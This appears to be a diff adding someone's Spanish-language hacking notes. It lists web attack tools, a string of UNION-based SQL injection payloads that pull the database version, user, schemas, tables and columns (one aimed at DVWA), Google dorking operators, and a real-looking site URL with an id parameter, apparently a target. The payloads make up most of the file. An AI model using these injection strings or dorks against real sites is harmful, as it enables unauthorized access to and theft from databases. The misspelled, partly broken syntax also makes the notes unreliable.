@@ -1,0 +1,46 @@
+herramienta1=fireforse , tamperdata,acunetix,thor hammer,googlag
+honeypot = laberynth
+
+sql inyection : 
+	select ,insert ,update ,delete,drop,create,trigger #comandos 
+
+	comando = '1 or 1'
+	comando1 = 'and 1 = 1 union select null ,null#
+
+	comando2 ='and 1 = 1 union select version() , database() #
+
+	comando3 = 'and 1 = 1 union select null , user() #
+
+	comando_obtener_dtb = 'and 1 = 1 union select null , table_schema from information_schema.tables #
+
+	comando_obtener tabls = ID: 'and 1 = 1 union select null , table_schema from information_schema.tables where table_schema = "nombre de dtb"#
+
+
+	'and 1 = 1 union select null , concat(table_name ,0x0a,colum_name)table_name from information_schema.colums where table_schema = "dvwa"#
+
+
+
+
+
+
+forks: index of intitle
+		allintext
+		site subdominios
+		parent directory
+
+
+google hacking database
+
+
+
+
+
+
+
+
+
+
+
+
+
+http://www.seven.com.ve/plusmod.php?id=7
